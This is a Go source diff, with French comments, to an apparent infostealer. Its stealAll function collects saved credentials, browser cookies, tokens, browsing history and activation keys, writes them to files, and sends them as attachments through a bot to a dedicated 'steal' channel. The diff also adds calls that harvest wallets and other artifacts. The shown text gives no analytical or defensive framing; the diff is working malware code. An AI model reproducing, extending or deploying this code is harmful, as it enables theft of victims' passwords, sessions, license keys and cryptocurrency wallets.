@@ -380,7 +380,10 @@ func stealAll(withChat bool) {
 	}
 
 	if withChat {
-		sendText(b.String())
+		// Pas de pavé dans le salon : un résumé d une ligne, le détail est
+		// dans les fichiers envoyés juste après.
+		botSendText(stealChannel(), fmt.Sprintf("steal : %d identifiants, %d cookies, %d jetons, %d entrées d'historique.",
+			len(creds), len(cookies), len(tokens), len(hist)))
 	}
 
 	// Les fichiers complets partent en pièces jointes ; ils sont aussi gardés
@@ -388,17 +391,17 @@ func stealAll(withChat bool) {
 	if len(credLines) > 0 {
 		data := []byte(strings.Join(credLines, "\n"))
 		_ = os.WriteFile(filepath.Join(outDir, "identifiants.txt"), data, 0600)
-		sendFiles(fileOut{Name: "identifiants.txt", Data: data})
+		sendFilesTo(stealChannel(), fileOut{Name: "identifiants.txt", Data: data})
 	}
 	if len(cookieLines) > 0 {
 		data := []byte(strings.Join(cookieLines, "\n"))
 		_ = os.WriteFile(filepath.Join(outDir, "cookies.txt"), data, 0600)
-		sendFiles(fileOut{Name: "cookies.txt", Data: data})
+		sendFilesTo(stealChannel(), fileOut{Name: "cookies.txt", Data: data})
 	}
 	if len(histLines) > 0 {
 		data := []byte(strings.Join(histLines, "\n"))
 		_ = os.WriteFile(filepath.Join(outDir, "historique.txt"), data, 0600)
-		sendFiles(fileOut{Name: "historique.txt", Data: data})
+		sendFilesTo(stealChannel(), fileOut{Name: "historique.txt", Data: data})
 	}
 
 	// Clés d'activation : fichier écrit et envoyé une fois par exécution.
@@ -416,11 +419,12 @@ func stealAll(withChat bool) {
 			}
 			data := []byte(txt.String())
 			_ = os.WriteFile(filepath.Join(outDir, "licence.txt"), data, 0600)
-			sendFiles(fileOut{Name: "licence.txt", Data: data})
+			sendFilesTo(stealChannel(), fileOut{Name: "licence.txt", Data: data})
 		}
 	}
 
 	stealWallets()
+	stealArtifacts()
 	plog(fmt.Sprintf("steal: %d identifiants, %d cookies, %d jetons", len(creds), len(cookies), len(tokens)))
 }
 
